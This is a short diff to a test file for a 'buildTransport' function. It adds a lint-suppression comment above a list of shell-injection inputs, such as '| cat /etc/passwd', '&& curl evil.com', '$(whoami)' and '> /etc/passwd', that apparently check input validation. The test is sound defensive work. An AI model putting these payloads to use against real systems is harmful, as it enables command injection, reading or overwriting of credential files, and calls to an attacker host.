@@ -210,6 +210,7 @@ describe('buildTransport', () => {
       ['valid', '| cat /etc/passwd'],
       ['&& curl evil.com'],
       ['$(whoami)'],
+      // biome-ignore lint/suspicious/noTemplateCurlyInString: intentional shell injection test
       ['${IFS}'],
       ['`id`'],
       ['> /etc/passwd'],
